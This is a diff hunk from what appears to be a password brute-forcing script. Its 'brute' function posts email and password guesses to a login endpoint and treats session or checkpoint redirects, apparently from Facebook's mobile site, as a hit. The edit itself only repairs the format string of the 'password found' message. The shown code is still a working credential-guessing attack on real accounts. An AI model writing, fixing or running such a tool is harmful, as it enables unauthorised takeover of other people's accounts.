@@ -39,7 +39,7 @@ def brute(id,pw):
 	data = {"email":id, "pass":pw}
 	r = requests.post(link, data=data)
 	if "m_sess" in r.url or "save-device" in r.url:
-		print("%s[ %found%s ] password found : "%(w,r,w) + pw)
+		print("%s[ %sfound%s ] password found : %s"%(w,r,w,g) + pw)
 		print("%s"%(w))
 		exit()
 	elif "checkpoint" in r.url:
